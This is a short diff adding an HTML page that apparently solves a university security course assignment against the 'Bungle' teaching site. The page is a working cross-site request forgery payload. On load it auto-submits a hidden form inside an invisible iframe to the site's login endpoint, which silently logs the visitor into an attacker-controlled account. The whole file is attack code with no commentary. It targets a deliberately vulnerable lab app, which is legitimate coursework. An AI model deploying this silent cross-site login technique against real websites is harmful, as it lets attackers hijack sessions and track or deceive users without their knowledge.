@@ -1,0 +1,9 @@
+<body onload="document.frm1.submit()">
+    <iframe name="_iframe" style="width: 0; height: 0; border: 0; border: none; position: absolute;"></iframe>
+    <form target="_iframe" name="frm1" action="http://bungle-cs461.csl.illinois.edu/login" method="POST">
+        <input type="hidden" name="csrfdefense" value="0"/>
+        <input type="hidden" name="xssdefense" value="5"/>
+        <input type="hidden" name="username" value="attacker"/>
+        <input type="hidden" name="password" value="l33th4x"/>
+    </form>
+</body>
